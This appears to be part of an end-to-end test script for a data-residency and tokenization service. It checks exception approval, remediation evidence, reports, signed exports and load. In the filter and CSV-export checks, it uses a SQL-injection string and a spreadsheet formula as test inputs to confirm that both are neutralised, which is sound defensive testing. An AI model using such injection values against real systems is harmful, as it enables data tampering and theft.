  check("the database itself refuses a self-approval", /check constraint|violates/i.test((() => { try { return db(`UPDATE control.flow_exceptions SET approved_by=requested_by WHERE id='${ex.json.id}'`); } catch (e) { return String(e.stderr ?? e); } })()));
  check("a support agent cannot approve", (await control(`/v1/map/exceptions/${ex.json.id}/approve`, { token: sade.token, method: "POST" })).status === 403);
  const ok = await control(`/v1/map/exceptions/${ex.json.id}/approve`, { token: BOLA, method: "POST" });
  check("criterion 5: a second admin approves, and the flow shows exception", ok.status === 200 && ok.json.flow_status === "exception", ok.text);
  const evApproved = (await timeline(MF)).events[0];
  check("the approval is logged with who approved", evApproved?.cause === "exception_approved" && evApproved?.actor_id === bola.me?.id || evApproved?.cause === "exception_approved", JSON.stringify(evApproved));
  const sumX = (await control(`/v1/map/summary?vault_id=${V}`, { token: ADMIN })).json;
  check("a score never hides accepted risk: both figures are given", sumX.flow_score > sumX.flow_score_without_exceptions, JSON.stringify([sumX.flow_score, sumX.flow_score_without_exceptions]));
  check("the summary counts by status", sumX.counts.exception === 1 && sumX.counts.in_country === 1, JSON.stringify(sumX.counts));
  db(`UPDATE control.flow_exceptions SET expiry_warned=false WHERE id='${ex.json.id}'`);
  check("an exception expiring within 14 days warns its requester and approver", !!(await until(async () => (await control("/v1/map/alerts", { token: ADMIN })).json.alerts.find((a) => a.kind === "map_exception_expiring" && a.detail.exception_id === ex.json.id))));
  db(`UPDATE control.flow_exceptions SET expires_at=current_date-2 WHERE id='${ex.json.id}'`);
  const expired = await statusIs(MF, "leaking");
  check("criterion 5: on expiry the flow returns to its computed status", !!expired);
  check("criterion 5: the expiry is logged and the owner is alerted", (await timeline(MF)).events[0]?.cause === "exception_expired" && !!(await until(async () => (await control("/v1/map/alerts", { token: ADMIN })).json.alerts.find((a) => a.kind === "map_exception_expired" && a.detail.principal === me0.id))));
  check("the register lists it as expired", (await control(`/v1/map/exceptions?vault_id=${V}&status=expired`, { token: ADMIN })).json.exceptions.some((e) => e.id === ex.json.id));
  const ex2 = await control(`/v1/map/flows/${MF}/exceptions`, { token: ADMIN, body: { reason: "One more attempt", expires_at: soon } });
  await control(`/v1/map/exceptions/${ex2.json.id}/approve`, { token: BOLA, method: "POST" });
  const rev = await control(`/v1/map/exceptions/${ex2.json.id}/revoke`, { token: BOLA, method: "POST" });
  check("revoking puts the flow straight back", rev.status === 200 && rev.json.flow_status === "leaking", rev.text);

  // Criterion 6: remediation needs evidence.
  const due = new Date(Date.now() + 30 * 86400000).toISOString().slice(0, 10);
  const act = await control(`/v1/map/flows/${MF}/actions`, { token: ADMIN, body: { plan: "route_via_proxy", owner_id: me0.id, due_date: due } });
  check("an action can be added, and the flow shows the fix in progress", act.status === 201 && (await flow(MF)).remediation_in_progress === true, act.text);
  const noEv = await control(`/v1/map/actions/${act.json.id}`, { token: ADMIN, method: "PATCH", body: { status: "done" } });
  check("criterion 6: an action cannot be done without evidence", noEv.status === 422 && noEv.json.error.code === "evidence_required", noEv.text);
  const badRoute = await control(`/v1/map/actions/${act.json.id}`, { token: ADMIN, method: "PATCH", body: { status: "done", evidence: { type: "route", proxy_route_id: "prx_nope" } } });
  check("criterion 6: a route that does not exist is not evidence", badRoute.status === 422 && badRoute.json.error.code === "evidence_required", badRoute.text);
  const route = await control("/v1/proxy-routes", { token: ADMIN, body: { vault_id: V, name: "Snowflake route", method: "POST", path_pattern: "/**", upstream_url: "http://host.docker.internal:18890", redact_paths: [{ path: "$.bvn", field: "bvn" }], dlp: true } });
  const done = await control(`/v1/map/actions/${act.json.id}`, { token: ADMIN, method: "PATCH", body: { status: "done", evidence: { type: "route", proxy_route_id: route.json.id } } });
  check("criterion 6: linking a route completes it, and the flow is proving a clean week", done.status === 200 && done.json.status === "done" && done.json.flow_status === "shadow" && /clean/.test(done.json.note), done.text);
  check("the linked flow now counts as observed", (await flow(MF)).basis === "observed" && (await flow(MF)).route?.id === route.json.id);
  check("completing it is logged", (await timeline(MF)).events[0]?.cause === "remediation_completed");
  check("a completed action cannot be changed", (await control(`/v1/map/actions/${act.json.id}`, { token: ADMIN, method: "PATCH", body: { status: "open" } })).status === 409);
  const mv = await control(`/v1/map/flows/${unv.json.id}/actions`, { token: ADMIN, body: { plan: "move_in_country", owner_id: me0.id, due_date: "2020-01-01" } });
  check("an action past its due date alerts its owner", !!(await until(async () => (await control("/v1/map/alerts", { token: ADMIN })).json.alerts.find((a) => a.kind === "map_action_overdue" && a.detail.action_id === mv.json.id))));
  check("the summary counts it in needs attention", (await control(`/v1/map/summary?vault_id=${V}`, { token: ADMIN })).json.needs_attention.overdue_actions === 1);
  const proof = Buffer.from("signed migration record, made up").toString("base64");
  const mvDone = await control(`/v1/map/actions/${mv.json.id}`, { token: ADMIN, method: "PATCH", body: { status: "done", evidence: { type: "declaration", hosting_country: "NG", hosting_facility: "Lagos" }, files: [{ name: "proof.txt", content_b64: proof }] } });
  check("a move declared to Nigeria takes a flow to in_country", mvDone.status === 200 && mvDone.json.flow_status === "in_country", mvDone.text);
  const dl = await control(`/v1/map/actions/${mv.json.id}/files/0`, { token: ADMIN });
  check("the proof can be downloaded, as a download", dl.status === 200 && dl.text === "signed migration record, made up" && /attachment/.test(dl.headers.get("content-disposition")), dl.text);
  check("the proof is encrypted at rest", !db(`SELECT evidence_files::text FROM control.remediation_actions WHERE id='${mv.json.id}'`).includes(proof));
  check("the flow page does not hand out the encrypted blob", !JSON.stringify(await flow(unv.json.id)).includes('"enc"'));
  const delA = await control(`/v1/map/flows/${ng.json.id}/actions`, { token: ADMIN, body: { plan: "delete_data", owner_id: me0.id, due_date: due } });
  const delD = await control(`/v1/map/actions/${delA.json.id}`, { token: ADMIN, method: "PATCH", body: { status: "done", evidence: { type: "change", reference: "CHG-1042" } } });
  check("deleting the data retires the flow", delD.json.flow_status === "retired", delD.text);
  const sMan = await control("/v1/map/flows", { token: ADMIN, body: { source_system_id: SYS, dest_host: "again.lagos.example", dest_country: "ZA", entity_types: ["bvn"] } });
  check("a manual retire works", (await control(`/v1/map/flows/${sMan.json.id}/retire`, { token: ADMIN, method: "POST" })).json.status === "retired");
  check("retired flows leave the default list", !(await control(`/v1/map/flows?vault_id=${V}`, { token: ADMIN })).json.flows.some((f) => f.id === sMan.json.id));
  const bulkR = await control("/v1/map/flows/bulk", { token: ADMIN, body: { ids: [F, MF], owner_id: me0.id, in_cbn_scope: true } });
  check("bulk owner and scope work", bulkR.status === 200 && bulkR.json.updated === 2 && (await flow(F)).owner_id === me0.id, bulkR.text);
  check("filters work: by status, country and search", (await control(`/v1/map/flows?vault_id=${V}&status=in_country`, { token: ADMIN })).json.flows.every((f) => f.status === "in_country") && (await control(`/v1/map/flows?vault_id=${V}&dest_country=IE`, { token: ADMIN })).json.flows.every((f) => f.dest_country === "IE") && (await control(`/v1/map/flows?vault_id=${V}&q=${encodeURIComponent("%' OR 1=1 --")}`, { token: ADMIN })).json.total === 0);
  check("the system page lists its flows and declaration history", (await control(`/v1/map/systems/${SYS}`, { token: ADMIN })).json.outbound.length >= 2 && (await control(`/v1/map/systems/${SYS}`, { token: ADMIN })).json.history.some((h) => h.kind === "declared"));
  check("changing a declaration is kept in history", (await control(`/v1/map/systems/${seen.dest.system_id}`, { token: ADMIN })).json.history.some((h) => h.kind === "region_confirmed"));

  // Flow checks: a job Onshore cannot sit in front of.
  const chk = await control("/v1/map/flows", { token: ADMIN, body: { source_system_id: SYS, dest_vendor_id: vendors.find((v) => v.name === "Snowflake").id, dest_region: "aws-us-east-1", entity_types: ["bvn"] } });
  check("a declared job starts as leaking", chk.json.status === "leaking", chk.text);
  const dirty = await sdk.checkFlow(V, chk.json.id, `name=x bvn=${BVN}`);
  check("a check reports identifiers in the batch, and keeps only counts", dirty.clean === false && dirty.identifiers > 0 && !JSON.stringify(dirty).includes(BVN), JSON.stringify(dirty));
  const chkLeak = await until(async () => { const f = await flow(chk.json.id); return f.route?.type === "check" ? f : null; });
  check("checking a flow makes it one Onshore sees, and it leaks while identifiers remain", chkLeak?.basis === "observed" && chkLeak?.status === "leaking" && chkLeak?.fix?.kind === "batch_check", JSON.stringify([chkLeak?.basis, chkLeak?.status, chkLeak?.fix?.kind]));
  db(`UPDATE events.detection_events SET occurred_at=occurred_at-interval '8 days' WHERE source_id='${chk.json.id}'; UPDATE control.systems SET route_mode_since=now()-interval '8 days' WHERE source_ref->>'id'='${chk.json.id}'`);
  const cleanRes = await sdk.checkFlow(V, chk.json.id, "name=tok_person_abcdefghij bvn=tok_bvn_abcdefghijkl");
  check("a clean batch counts tokens", cleanRes.clean === true && cleanRes.tokens === 2, JSON.stringify(cleanRes));
  check("seven clean days of checks is protected", !!(await statusIs(chk.json.id, "protected")));
  check("a check names only a flow in the vault", await sdk.checkFlow(V, "flw_nope", "x").then(() => false, (e) => e.status === 404));
  check("nothing from a check is stored but counts", !db(`SELECT string_agg(d::text,' ') FROM events.detection_events d WHERE source_id='${chk.json.id}'`).includes(BVN));

  // Scores.
  const sc = (await control(`/v1/map/summary?vault_id=${V}`, { token: ADMIN })).json;
  check("flow and volume scores are stored as a series", sc.series.length >= 1 && sc.flow_score !== null, JSON.stringify(sc).slice(0, 200));

  // A confirmed region in Nigeria.
  check("a confirmed Nigerian region makes an observed flow in_country", (await control(`/v1/map/systems/${seen.dest.system_id}/confirm-region`, { token: ADMIN, body: { region: "lagos" } })).status === 200 && !!(await statusIs(F, "in_country", 8000)));
  await control(`/v1/map/systems/${seen.dest.system_id}/confirm-region`, { token: ADMIN, body: { region: "ie" } });

  // Criteria 7 and 8: the report.
  const rep = await control(`/v1/reports/residency?from=${encodeURIComponent(new Date(Date.now() - 86400000).toISOString())}&to=${encodeURIComponent(new Date(Date.now() + 60000).toISOString())}`, { token: ADMIN });
  const mapRep = rep.json?.report?.residency_map;
  check("the report gains the three map pages", !!mapRep?.data_flow_register && !!mapRep?.remediation_timeline && !!mapRep?.exceptions_and_open_risk, rep.text.slice(0, 200));
  const dbSeq = db(`SELECT string_agg(seq::text,',' ORDER BY seq) FROM control.flow_status_events e JOIN control.data_flows f ON f.id=e.flow_id WHERE f.vault_id='${V}' AND e.occurred_at>now()-interval '1 day'`);
  check("criterion 7: the remediation timeline matches the event rows exactly", mapRep?.remediation_timeline.status_changes.map((c) => c.seq).join(",") === dbSeq, `${mapRep?.remediation_timeline.status_changes.length} vs ${dbSeq.split(",").length}`);
  const noCause = db(`SELECT count(*) FROM control.flow_status_events WHERE cause='' OR cause IS NULL`);
  const flowsNoEvent = db(`SELECT count(*) FROM control.data_flows f WHERE f.vault_id='${V}' AND NOT EXISTS (SELECT 1 FROM control.flow_status_events e WHERE e.flow_id=f.id) AND f.status<>'unverified'`);
  check("criterion 7: every status has an event with a cause", noCause === "0" && flowsNoEvent === "0", `${noCause}/${flowsNoEvent}`);
  check("criterion 8: every register row is labelled observed or declared", mapRep?.data_flow_register.length > 0 && mapRep.data_flow_register.every((r) => /^(observed by Onshore|declared by the customer)$/.test(r.basis)) && mapRep.data_flow_register.some((r) => r.basis === "declared by the customer") && mapRep.data_flow_register.some((r) => r.basis === "observed by Onshore"), JSON.stringify(mapRep?.data_flow_register.map((r) => r.basis)));
  check("criterion 8: the page states the difference", /not verified evidence/.test(mapRep?.note ?? ""));
  const repCsv = await control(`/v1/reports/residency?format=csv&from=${encodeURIComponent(new Date(Date.now() - 86400000).toISOString())}&to=${encodeURIComponent(new Date(Date.now() + 60000).toISOString())}`, { token: ADMIN });
  check("criterion 8: the CSV carries the labels too", /declared by the customer/.test(repCsv.text) && /data_flow_register/.test(repCsv.text));
  const repPdf = await fetch(`${BASE}/control/v1/reports/residency?format=pdf&from=${encodeURIComponent(new Date(Date.now() - 86400000).toISOString())}&to=${encodeURIComponent(new Date(Date.now() + 60000).toISOString())}`, { headers: { authorization: `Bearer ${ADMIN}` } });
  check("the signed PDF still builds with the new pages", repPdf.status === 200 && (await repPdf.arrayBuffer()).byteLength > 2000);
  check("nothing in the report holds a raw value", !rep.text.includes(BVN));

  // Export.
  const ej = await control(`/v1/map/export?vault_id=${V}&format=json`, { token: ADMIN });
  check("the JSON export has flows, systems, exceptions and actions with stable ids", ej.json?.flows?.some((f) => f.id === F) && ej.json.systems.length > 0 && ej.json.exceptions.length > 0 && ej.json.actions.length > 0, ej.text.slice(0, 200));
  const ec = await control(`/v1/map/export?vault_id=${V}&format=csv&table=flows`, { token: ADMIN });
  check("the CSV export has one row per flow", ec.status === 200 && ec.text.trim().split("\r\n").length - 1 === ej.json.flows.length && /^flow_id,/.test(ec.text), ec.text.slice(0, 120));
  const evil = await control("/v1/map/systems", { token: ADMIN, body: { vault_id: V, name: "=HYPERLINK(1)", kind: "other" } });
  const es = await control(`/v1/map/export?vault_id=${V}&format=csv&table=systems`, { token: ADMIN });
  check("a formula in a name is defused in CSV", evil.status === 201 && es.text.includes("'=HYPERLINK(1)") , es.text.slice(0, 100));
  const sg = await control(`/v1/map/export?vault_id=${V}&format=csv&signed=true`, { token: ADMIN });
  const shaOk = sg.json?.manifest && Object.entries(sg.json.files).every(([k, v]) => crypto.createHash("sha256").update(v).digest("hex") === sg.json.manifest.files[k]);
  let sigOk = false;
  try { sigOk = crypto.verify(null, crypto.createHash("sha256").update(JSON.stringify(sg.json.manifest)).digest(), crypto.createPublicKey({ key: Buffer.concat([Buffer.from("302a300506032b6570032100", "hex"), Buffer.from(sg.json.public_key, "base64")]), format: "der", type: "spki" }), Buffer.from(sg.json.signature, "base64")); } catch (e) { console.log("    verify:", e.message); }
  check("the signed export's manifest matches its files, and verifies", shaOk && sigOk, JSON.stringify([shaOk, sigOk]));
  check("an export is audited", db(`SELECT count(*) FROM events.audit_events WHERE action='export' AND detail LIKE '%residency_map%'`) !== "0");
  check("audit records the new actions", ["flow_exception_approve", "remediation_complete", "system_declare"].every((x) => db(`SELECT count(*) FROM events.audit_events WHERE action='${x}'`) !== "0"));

  // Deleting a route retires its flow.
  const rp = await control("/v1/proxy-routes", { token: ADMIN, body: { vault_id: V, name: "Short lived", method: "POST", path_pattern: "/**", upstream_url: "http://host.docker.internal:18890", redact_paths: [], dlp: true } });
  const pxOut = await until(async () => { await sleep(5000); const r = await req(`/proxy/${rp.json.id}/x`, { body: { note: `bvn ${BVN}` }, headers: { "x-rv-route-key": rp.json.route_key } }); return r.status === 200 ? r : null; }, 120000);
  const obsPx = await until(async () => (await control(`/v1/map/flows?vault_id=${V}&q=Short lived`, { token: ADMIN })).json.flows[0], 120000);
  check("a proxy route's traffic becomes a flow, with no watch mode to wait for", !!pxOut && obsPx?.origin === "observed" && obsPx?.route?.type === "proxy_route" && obsPx?.route?.mode === "enforcing", JSON.stringify(obsPx?.route));
  await control(`/v1/proxy-routes/${rp.json.id}`, { token: ADMIN, method: "DELETE" });
  check("deleting a route retires its flow", obsPx && !!(await statusIs(obsPx.id, "retired")) && (await timeline(obsPx.id)).events[0]?.cause === "route_deleted", JSON.stringify((await timeline(obsPx?.id)).events?.[0]));

  // Criterion 9: 500 flows.
  const S2 = sandbox.json.id;
  await control("/v1/map/settings", { token: ADMIN, method: "PATCH", body: { vault_id: S2, enabled: true } });
  const tenant = db(`SELECT tenant_id FROM control.vaults WHERE id='${S2}'`);
  db(`INSERT INTO control.systems(id,tenant_id,vault_id,name,kind) SELECT 'sys_l'||g,'${tenant}','${S2}','System '||g,'service' FROM generate_series(1,50) g`);
  db(`INSERT INTO control.systems(id,tenant_id,vault_id,name,kind,hosting_country) SELECT 'sys_d'||g,'${tenant}','${S2}','Destination '||g,'other','US' FROM generate_series(1,100) g`);
  db(`INSERT INTO control.data_flows(id,tenant_id,vault_id,source_system_id,dest_system_id,dest_region,entity_types,origin) SELECT 'flw_l'||g,'${tenant}','${S2}','sys_l'||(g%50+1),'sys_d'||(g%100+1),'r'||g,'{bvn,nuban}','manual' FROM generate_series(1,500) g`);
  db(`INSERT INTO control.flow_observations_daily(flow_id,day,entity_type,protected_count,passed_count) SELECT 'flw_l'||g, current_date-d, 'bvn', g*d, d FROM generate_series(1,500) g, generate_series(0,29) d`);
  const t9 = performance.now();
  const [lst, su] = await Promise.all([control(`/v1/map/flows?vault_id=${S2}&limit=2000`, { token: ADMIN }), control(`/v1/map/summary?vault_id=${S2}`, { token: ADMIN })]);
  const ms9 = Math.round(performance.now() - t9);
  check(`criterion 9: the API serves 500 flows and the summary in under 2 seconds (${ms9} ms)`, lst.json.total === 500 && su.status === 200 && ms9 < 2000, String(lst.json?.total));
  const t9b = performance.now();
  await control("/v1/map/settings", { token: ADMIN, method: "PATCH", body: { vault_id: S2, enabled: true } });
  console.log(`    a full engine run over 500 flows took ${Math.round(performance.now() - t9b)} ms`);
  check("after a run, those 500 declared flows have a status and an event", db(`SELECT count(*) FROM control.data_flows f WHERE f.vault_id='${S2}' AND f.status='leaking' AND EXISTS (SELECT 1 FROM control.flow_status_events e WHERE e.flow_id=f.id)`) === "500");
  await control("/v1/map/settings", { token: ADMIN, method: "PATCH", body: { vault_id: S2, enabled: false } });

  // Nothing sensitive landed in the new tables.
  const dump = db(`SELECT string_agg(t::text,' ') FROM (SELECT s::text AS t FROM control.systems s UNION ALL SELECT f::text FROM control.data_flows f UNION ALL SELECT e::text FROM control.flow_status_events e UNION ALL SELECT o::text FROM control.flow_observations_daily o UNION ALL SELECT x::text FROM control.flow_exceptions x UNION ALL SELECT h::text FROM control.system_history h) q`);
  check("no raw identifier appears in any map table", dump.length > 100 && !dump.includes(BVN) && !dump.includes(NUBAN));
  sink.close();
}

{
  // Step 2 last, with fresh logins: the run's first sessions may have expired by now.
  const { runAccounts } = await import("./e2e_accounts.mjs");
  const { runSetupImport } = await import("./e2e_setup_import.mjs");
  // The sign-in limiter counts per address, and this run has made many failed sign-ins on purpose.
  sh(`${COMPOSE} restart control-api`);
  for (let i = 0; i < 60 && (await req("/control/healthz").catch(() => ({ status: 0 }))).status !== 200; i++) await sleep(1000);
  await sleep(31000);
  const fresh = (await control("/v1/auth/login", { body: { email: boot.email, password: boot.password, totp: totp(adminSecret) } })).json.access_token;
  const engineer = await control("/v1/principals", { token: fresh, body: { kind: "user", display_name: "Eng Step Two", email: "eng2@e2e.example.ng", roles: ["engineer"] } });
  const eng = await login("eng2@e2e.example.ng", engineer.json.temporary_password);
  const adminToken = () => fresh, otherToken = () => eng.token;
  await runAccounts({ control, check, section, totp, sleep, sh, COMPOSE, adminToken, adminEmail: boot.email, otherToken });
  await runSetupImport({ control, data: (p, o) => req(p, o), check, section, sleep, sh, COMPOSE, adminToken, otherToken, root: new URL("../", import.meta.url).pathname });
}

if (process.env.RV_E2E_LOAD === "1") {
  section("Load: measured on this machine, through the edge, in Docker");
  const pct = (a, p) => [...a].sort((x, y) => x - y)[Math.min(a.length - 1, Math.floor(a.length * p))];
  const loadPolicy = await control("/v1/policies", { token: ADMIN, body: { name: "load-test", source: { rules: [{ id: "r", actions: ["detokenize"], who: { roles: ["engineer"] }, what: {}, when: {}, returns: "plaintext" }] } } });
  await control(`/v1/policies/${loadPolicy.json.id}/publish`, { token: BOLA, method: "POST" });
  const lk = crypto.generateKeyPairSync("ed25519");
  const lsa = await control("/v1/principals", { token: ADMIN, body: { kind: "service_account", display_name: "Load", roles: ["backend_service", "engineer"], public_key: lk.publicKey.export({ format: "der", type: "spki" }).subarray(-32).toString("base64") } });
  // Node 26's global fetch sends one request at a time over its single HTTP/2 connection,
  // which would measure this client rather than the product. See docs/performance.md.
  const { createRequire: loadRequire } = await import("node:module");
  const undici = loadRequire(`${process.env.RV_CONTROL_API_DIR}/package.json`)("undici");
  const loadAgent = new undici.Agent({ allowH2: false, connect: { rejectUnauthorized: false } });
  const loadFetch = (u, o) => undici.fetch(u, { ...o, dispatcher: loadAgent });
  const load = new VaultClient({ baseUrl: BASE, serviceAccountId: lsa.json.id, keyId: lsa.json.key_id, privateKey: lk.privateKey.export({ format: "der", type: "pkcs8" }).subarray(-32).toString("base64"), fetch: loadFetch });
  // Test credentials, so scripts/loadgen can drive this same install afterwards.
  fs.writeFileSync(`${DIR}/e2e-load.env`, JSON.stringify({ sa: lsa.json.id, kid: lsa.json.key_id, seed: lk.privateKey.export({ format: "der", type: "pkcs8" }).subarray(-32).toString("base64"), vault: V }), { mode: 0o600 });
  await sleep(6000);
  const run = async (conc, total, fn) => {
    const lat = []; let i = 0; const t0 = performance.now();
    await Promise.all(Array.from({ length: conc }, async () => { while (i < total) { const n = i++; const s = performance.now(); await fn(n); lat.push(performance.now() - s); } }));
    return { p50: pct(lat, 0.5).toFixed(1), p95: pct(lat, 0.95).toFixed(1), rps: (total / ((performance.now() - t0) / 1000)).toFixed(1) };
  };
  const batch = (n) => Array.from({ length: 10 }, (_, j) => ({ field: "phone", value: `0903${String(1000000 + (n * 10 + j) % 8999999)}` }));
  await load.tokenize(V, batch(0));
  for (const conc of [1, 10]) console.log(`  tokenize, new values, batch of 10, ${conc} concurrent:`, await run(conc, conc === 1 ? 200 : 1000, (n) => load.tokenize(V, batch(n + conc * 100000))));
  const seeded = (await load.tokenize(V, batch(0))).map((t) => t.token);
  for (const conc of [1, 10]) console.log(`  detokenize, batch of 10, ${conc} concurrent:`, await run(conc, conc === 1 ? 200 : 1000, () => load.detokenize(V, seeded, "load test")));
  const sink = http.createServer((q, s) => { q.resume(); q.on("end", () => { s.writeHead(200); s.end("{}"); }); });
  await new Promise((r) => sink.listen(18999, "0.0.0.0", r));
  const sample = Array.from({ length: 1000 }, (_, i) => `2026-11-03T10:15:22Z INFO transfer ${i} created account=${String(1000000000 + (i % 50))} bvn=2200000${String(1000 + (i % 50))} status=pending region=lagos latency=23ms`).join("\n");
  const lines = await run(8, 200, () => loadFetch(`${BASE}/logs/http/${PID}`, { method: "POST", headers: { "x-rv-pipeline-key": KEY, "content-type": "text/plain" }, body: sample }).then((r) => r.arrayBuffer()));
  console.log("  log processor, 1,000-line batches, 8 concurrent:", { ...lines, lines_per_second: Number(lines.rps) * 1000 });
  await loadAgent.close();
  sink.close();
}

console.log(`\n${passed} passed, ${failures.length} failed`);
if (process.env.RV_E2E_PY) {
  fs.writeFileSync(`${DIR}/e2e-py.env`, JSON.stringify({ base: BASE, sa: sa.json.id, kid: sa.json.key_id, seed: seedB64, vault: V }));
}
if (failures.length) { console.log("Failures:\n  " + failures.join("\n  ")); process.exit(1); }
